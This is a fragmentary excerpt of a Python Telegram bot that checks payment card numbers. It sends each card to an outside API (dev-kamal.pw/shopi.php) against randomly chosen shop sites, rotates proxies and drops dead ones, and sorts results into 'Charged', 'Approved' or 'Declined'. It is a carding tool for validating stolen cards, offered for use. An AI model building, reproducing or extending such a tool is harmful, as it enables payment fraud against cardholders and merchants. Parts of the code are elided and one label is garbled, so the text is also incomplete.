...
# API Configuration
BASE_API_URL = "http://dev-kamal.pw/shopi.php"
...
def classify_api_response(response_json):
    ...
    if any(kw in response_lower for kw in charged_keywords):
        return {"Response": response, "Price": price, "Gateway": gateway, "Status": "Charged"}
    
    if any(kw in response_lower for kw in declined_keywords):
        return {"Response": response, "Price": price, "Gateway": gateway, "Status": "Declined"}
    
    if any(kw in response_lower for kw in approved_keywords):
        return {"Response": response, "Price": price, "Gateway": gateway, "Status": "Approved"}
    
    if status is True and response:
...
async def check_card_random_site(card, sites, user_id=None):
    ...
    try:
        ...
        # Add URL parameter (site)
        if selected_site:
            params['url'] = selected_site
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(BASE_API_URL, params=params) as res:
                if res.status != 200:
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-", "Status": "SiteError"}, site_index

                try:
                    response_json = await res.json()
                except Exception:
                    response_text = await res.text()
                    return {"Response": f"Invalid JSON: {response_text[:100]}", "Price": "-", "Gateway": "-", "Status": "SiteError"}, site_index
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(BASE_API_URL, params=params) as res:
                ...
                if proxy_data and user_id:
                    ...
                    if 'proxy' in resp_lower and ('dead' in resp_lower or 'error' in resp_lower or 'timeout' in resp_lower):
                        await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                        return {"status": "proxy_dead", "response": "Proxy is dead and has been removed! Please add a new proxy using /addpxy", "site": site, "price": "-"}
...
client = TelegramClient('cc_bo000tt', API_ID, API_HASH)
...
𝗖𝗖 ⇾ `{card}`
𝗚??𝘁𝗲𝘄𝗮𝘆 ⇾ {res.get('Gateway', 'Unknown')}
